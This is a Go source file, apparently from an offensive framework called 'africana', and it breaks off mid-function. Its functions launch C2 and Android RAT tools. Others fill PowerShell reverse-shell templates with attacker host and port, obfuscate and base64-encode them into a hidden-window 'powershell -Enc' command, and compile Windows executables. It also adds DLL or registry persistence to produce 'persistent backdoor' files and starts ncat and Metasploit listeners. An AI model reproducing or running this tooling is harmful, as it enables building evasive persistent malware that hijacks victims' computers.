package butchers

import (
    "os"
    "fmt"
    "log"
    "utils"
    "bufio"
    "bytes"
    "menus"
    "banners"
    "strings"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "unicode/utf16"
    "encoding/base64"
)

var(
    userInput   string
    userTarget  string
    userLhost   string
    userLPort   string
    userHport   string
    userMalware string
    userScript  string
    userOutput  string
    reader = bufio.NewReader(os.Stdin)
    scanner = bufio.NewScanner(os.Stdin)
)

func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
    fmt.Println()
}

func Shellz() {
    subprocess.Popen(`cd /root/.africana/africana-base/shells/; bash shells`)
}

func MeterPeter() {
    subprocess.Popen(`cd /root/.africana/africana-base/meterpeter/; pwsh meterpeter.ps1`)
}

func TearDroid() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "africana.apk" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userMalware, _ := reader.ReadString('\n')
    userMalware = strings.TrimSpace(userMalware)
    if userMalware == "" {
        userMalware = "africana.apk"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/teardroid/; python3 Teardroid.py -b %s`, userMalware)
}

func Chameleon() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/leviathan.txt"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; python3 chameleon.py -a %s -o %s`, userScript, userOutput)
}

func Gh0x0st() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Full path to your " + bcolors.PURPLE + ".Ps1" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userScript)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/leviathan.txt" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/levuathan.txt"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)
}

func BlackJack() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use " + bcolors.RED + "LISTENER " + bcolors.BLUE + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.ENDC + "or " + bcolors.BLUE + "0. " + bcolors.YELLOW + bcolors.ITALIC + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userInput, _ := reader.ReadString('\n')
    userInput = strings.TrimSpace(userInput)
    if userInput == "" {
        userInput = "1"
    }
    switch userInput {
    case "0":
        return
    case "1":
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        banners.Banner()
        subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -n %s`, userLport)
    case "2":
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "HPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "3333" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userHport, _ := reader.ReadString('\n')
        userHport = strings.TrimSpace(userHport)
        if userHport == "" {
            userHport = "3333"
        }
        banners.Banner()
        subprocess.Popen(`cd /root/.africana/africana-base/blackjack/; python3 BlackJack.py -q -i -c /root/.africana/certs/africana-cert.pem -k /root/.africana/certs/africana-key.pem -x %s -n %s`, userLport, userHport)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func PowerJoker() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLhost, _ := reader.ReadString('\n')
    userLhost = strings.TrimSpace(userLhost)
    if userLhost == "" {
        userLhost = userLhostIp
    }
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLport, _ := reader.ReadString('\n')
    userLport = strings.TrimSpace(userLport)
    if userLport == "" {
        userLport = "9999"
    }
    subprocess.Popen(`cd /root/.africana/africana-base/joker/; python3 joker.py -l %s -p %s`, userLhost, userLport)
}

func AndroRat() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana`)
        subprocess.Popen(`apt-get install /root/.africana/africana-base/androrat/zipalign_8.1.0.deb --allow-downgrades -y`)
    }
    fmt.Println()
    subprocess.Popen(`ip address`)
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLhost, _ := reader.ReadString('\n')
    userLhost = strings.TrimSpace(userLhost)
    if userLhost == "" {
        userLhost = userLhostIp
    }
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userLport, _ := reader.ReadString('\n')
    userLport = strings.TrimSpace(userLport)
    if userLport == "" {
        userLport = "9999"
    }
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output name " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "africana.apk" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userMalware, _ := reader.ReadString('\n')
    userMalware = strings.TrimSpace(userMalware)
    if userMalware == "" {
        userMalware = "africana_backdoor"
    }
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Output path " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "/root/.africana/output/" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userOutput, _ := reader.ReadString('\n')
    userOutput = strings.TrimSpace(userOutput)
    if userOutput == "" {
        userOutput = "/root/.africana/output/"
    }
    banners.Banner()
    subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --build -i %s -p %s -o %s`, userLhost, userLport, userOutput + userMalware + ".apk")
    subprocess.Popen(`cd /root/.africana/africana-base/androrat/; python3 androrat.py --shell -i %s -p %s`, userLhost, userLport)
}

func ShikataGanai() {
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "use " + bcolors.RED + "LISTENER " + bcolors.BLUE + "1. " + bcolors.YELLOW + "TCP " + bcolors.BLUE + "2. " + bcolors.YELLOW + "HTTPS " + bcolors.ENDC + bcolors.ITALIC + "or " + bcolors.BLUE + "0. " + bcolors.YELLOW + bcolors.ITALIC + "Go back" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    userInput, _ := reader.ReadString('\n')
    userInput = strings.TrimSpace(userInput)
    if userInput == "" {
        userInput = "1"
    }
    switch userInput {
    case "0":
        return
    case "1":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
            os.Exit(1)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        subprocess.Popen(`cp -r /root/.africana/africana-base/payload_templates/ncat_malwares/powershell_reverse_tcp.ps1 /root/.africana/output/powershell_reverse_tcp.txt`)
        filesToReplacements := map[string]map[string]string{
            "/root/.africana/output/powershell_reverse_tcp.txt": {
            `*LHOST*`: userLhost,
            `*LPORT*`: userLport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        userScript := `/root/.africana/output/powershell_reverse_tcp.txt`
        userOutput := `/root/.africana/output/powershell_reverse_tcp.ps1`
        subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)

        filePath := "/root/.africana/output/powershell_reverse_tcp.ps1"
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Printf("Error reading file: %v\n", err)
            return
        }

        utf16Content := utf16.Encode([]rune(string(content)))
        buf := new(bytes.Buffer)
        for _, v := range utf16Content {
            buf.Write([]byte{byte(v), byte(v >> 8)})
        }

        encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

        subprocess.Popen(`cp -r /root/.africana/africana-base/payload_templates/go_malwares/malware_complete.go /root/.africana/output/malware_complete.go`)
        Replacement := map[string]map[string]string{
            "/root/.africana/output/malware_complete.go": {
            `africana`: encoded,
            },
        }
        utils.Editors(Replacement)
        fmt.Printf(bcolors.BLUE + "\nBase64 Encoded PS1 Script: " + bcolors.ENDC + "pOwErSheLl -w 1 -Enc " + bcolors.DARKGREEN + `"%s"` + bcolors.ENDC , encoded)
        fmt.Printf(bcolors.BLUE + "\n\nIntergrating the Malware: " + bcolors.ENDC + "with base64!\n" + bcolors.DARKGREEN)
        subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -v -x -o /root/.africana/output/malware_complete.exe /root/.africana/output/malware_complete.go`)

    case "2":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
            os.Exit(1)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        subprocess.Popen(`cp -r /root/.africana/africana-base/payload_templates/ncat_malwares/powershell_reverse_http.ps1 /root/.africana/output/powershell_reverse_http.txt`)
        filesToReplacements := map[string]map[string]string{
            "/root/.africana/output/powershell_reverse_http.txt": {
            `*LHOST*`: userLhost,
            `*LPORT*`: userLport,
            },
        }
        fmt.Println()
        utils.Editors(filesToReplacements)
        userScript := `/root/.africana/output/powershell_reverse_http.txt`
        userOutput := `/root/.africana/output/powershell_reverse_http.ps1`
        subprocess.Popen(`cd /root/.africana/africana-base/chameleon/; pwsh -c "Import-Module ./chameleon.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, userScript, userOutput)

        filePath := "/root/.africana/output/powershell_reverse_http.ps1"
        content, err := ioutil.ReadFile(filePath)
        if err != nil {
            fmt.Printf("Error reading file: %v\n", err)
            return
        }

        utf16Content := utf16.Encode([]rune(string(content)))
        buf := new(bytes.Buffer)
        for _, v := range utf16Content {
            buf.Write([]byte{byte(v), byte(v >> 8)})
        }

        encoded := base64.StdEncoding.EncodeToString(buf.Bytes())

        subprocess.Popen(`cp -r /root/.africana/africana-base/payload_templates/go_malwares/malware_complete.go /root/.africana/output/malware_complete.go`)
        filesToReplace := map[string]map[string]string{
            "/root/.africana/output/malware_complete.go": {
            `africana`: encoded,
            },
        }
        utils.Editors(filesToReplace)
        fmt.Printf(bcolors.BLUE + "\nBase64 Encoded PS1 Script: " + bcolors.ENDC + "pOwErSheLl -w 1 -Enc " + bcolors.DARKGREEN + `"%s"` + bcolors.ENDC , encoded)
        fmt.Printf(bcolors.BLUE + "\n\nCompiling the Malware: " + bcolors.ENDC + "with base64\n" + bcolors.DARKGREEN)
        subprocess.Popen(`GOOS=windows GOARCH=amd64 go build -v -x -o /root/.africana/output/malware_complete.exe /root/.africana/output/malware_complete.go`)

    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func MalwareDll() {
    dllFilePath := "/root/.africana/africana-base/payload_templates/injected_dlls/Secur32.dll"
    exeFilePath := "/root/.africana/output/malware_complete.exe"

    dllData, err := ioutil.ReadFile(dllFilePath)
    if err != nil {
        log.Fatalf("Failed reading binary file: %s", err)
    }

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf("Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    subprocess.Popen(`cp -r /root/.africana/africana-base/payload_templates/go_malwares/malware_runner_dll.go /root/.africana/output/malware_runner_dll.go`)
    filesToReplacements := map[string]map[string]string{
        "/root/.africana/output/malware_runner_dll.go": {
        `africanas`: encodedExe,
        `africanax`: encodedDll,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf("Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf("Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.africana/output/malware_runner_dll.go"
    endMalwarePath := "/root/.africana/output/africana_backdoor.exe"
    fmt.Printf(bcolors.BLUE + "\nIntergrating Persistence Mechanisim: " + bcolors.ENDC + "in Malware!\n" + bcolors.DARKGREEN)
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    log.Printf(bcolors.BLUE + "\n\nPersistent BackDoor: " + bcolors.ENDC + "Saved at " + bcolors.RED + "%s", endMalwarePath)
}

func MalwareReg() {
    exeFilePath := "/root/.africana/output/malware_complete.exe"

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf("Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    subprocess.Popen(`cp -r /root/.africana/africana-base/payload_templates/go_malwares/malware_runner_reg.go /root/.africana/output/malware_runner_reg.go`)
    filesToReplacements := map[string]map[string]string{
        "/root/.africana/output/malware_runner_reg.go": {
        `africanas`: encodedExe,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf("Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf("Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.africana/output/malware_runner_reg.go"
    endMalwarePath := "/root/.africana/output/africana_reg_backdoor.exe"
    fmt.Printf(bcolors.BLUE + "\nIntergrating Persistence Mechanisim: " + bcolors.ENDC + "in Malware!\n" + bcolors.DARKGREEN)
    buildCmd := "go build -v -x -o %s %s"

    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)

    log.Printf(bcolors.BLUE + "\n\nPersistent BackDoor: " + bcolors.ENDC + "Saved at " + bcolors.RED + "%s", endMalwarePath)
}

func ListenerTcp() {
    fmt.Printf(bcolors.ENDC + bcolors.ITALIC + "\n                Select a Listener to Launch:" + bcolors.ENDC)
    menus.MenuFourSevenOne()
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "CodeCracker " + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🥥" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    scanner.Scan()
    userInput := scanner.Text()
    if userInput == "" {
        userInput = "1"
    }
    switch strings.ToLower(userInput) {
    case "0", "e", "exit", "back":
        return
    case "1":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
            os.Exit(1)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        fmt.Println(bcolors.ORANGE + `
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|
          ` + bcolors.DARKGREEN)
        subprocess.Popen(`ncat -lnvp %s`, userLport)
    case "2":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
            os.Exit(1)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLport, _ := reader.ReadString('\n')
        userLport = strings.TrimSpace(userLport)
        if userLport == "" {
            userLport = "9999"
        }
        subprocess.Popen(`msfdb start; msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, userLhostIp, userLport)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.RED + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
}

func ListenerHttp() {
    fmt.Printf(bcolors.DARKGREEN + "\nLaunching a Listener..." + bcolors.ENDC)
    menus.MenuFourSevenOne()
    fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Malware " + bcolors.ENDC + bcolors.ITALIC + "Select your " + bcolors.RED + "Choice" + bcolors.BLUE + ")" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "\n╰─🥥" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userInput)
    switch userInput {
    case "0", "e", "E", "exit", "Exit", "EXIT", "back", "Back", "BACK":
        return
    case "1":
        userLhostIp, err := utils.GetDefaultIP()
        if err != nil {
            fmt.Printf(bcolors.BLUE + "[+] " + bcolors.RED + "Error getting default userLhostIp:", err)
            os.Exit(1)
        }
        fmt.Println()
        subprocess.Popen(`ip address`)
        fmt.Printf(bcolors.BLUE + "\n╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "\n╰─🐭" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
